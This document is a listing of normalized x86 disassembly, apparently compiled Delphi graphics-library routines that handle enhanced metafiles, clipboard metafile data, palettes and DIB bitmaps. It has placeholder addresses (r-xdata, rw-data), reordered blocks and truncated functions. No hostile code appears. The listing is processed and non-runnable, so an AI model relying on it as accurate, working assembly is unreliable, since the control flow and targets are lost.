mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41e050
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a42
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026fc
retn
call sub_41e050
sub_420a4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420af3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_420ad1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4085cc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c6dc
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042f4
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f5a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ad8
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_420b2c
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420768
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420ba0
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420ba0
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_420ba0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_420768
pop esi
pop ebx
retn
mov eax ebx
call sub_420cf0
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420bdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_420768
pop esi
pop ebx
retn
mov eax ebx
call sub_420cf0
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420c1c
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420768
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420bdc
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420bdc
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_420c90
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415cf0
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_420cf0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_420768
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_42143c
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_421438
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_420d74
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_415cf0
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_420e80
mov edx ebx
mov eax esi
call sub_420df4
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_420df4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420e70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026fc
retn
sub_420e80
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402b98
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_415f54
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420fa2
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026fc
retn
call sub_41e0b0
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_41eea0
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420fbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420f9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_420fc8
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_420768
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_41e020
sub_42104c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_42111c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_414404
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4211ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4211c1
mov eax [ rw-data ]
call sub_414468
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_421192
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4212ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41dc58
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414098
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41dbfc
test al al
je r-xdata
sub_4211c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_414404
mov esi eax
xor ecx ecx
push ebp
push sub_421238
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414468
retn
mov edx ebx
mov eax esi
call sub_414098
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4212ac
sub_421244
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41d768
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_421280
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_4212ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d82c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_4212ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41da6c
xor edx edx
push ebp
push sub_421340
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41dde0
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_414418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dc58
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_42134c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41da6c
xor eax eax
push ebp
push sub_42142b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422668
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4211c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422768
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dde0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41437c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dc58
retn
sub_42143c
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403198
sub_42145c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4211c8
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_4214b8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41c094
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4211c8
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4211c8
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_421504
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41e8ec
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4215b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4215c0
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_42160c
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4211c8
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41e158
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41e158
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_421c5a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026dc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_421964
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41e038
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41e158
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41e158
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41e158
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41e158
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_421c0b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_421bfa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_421bd8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41e158
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4215c0
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028d8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41e8ec
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d64c
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412be0
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c964
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d610
call sub_41c964
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41e0b0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421bdf
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41e158
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_421bae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41e158
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026fc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
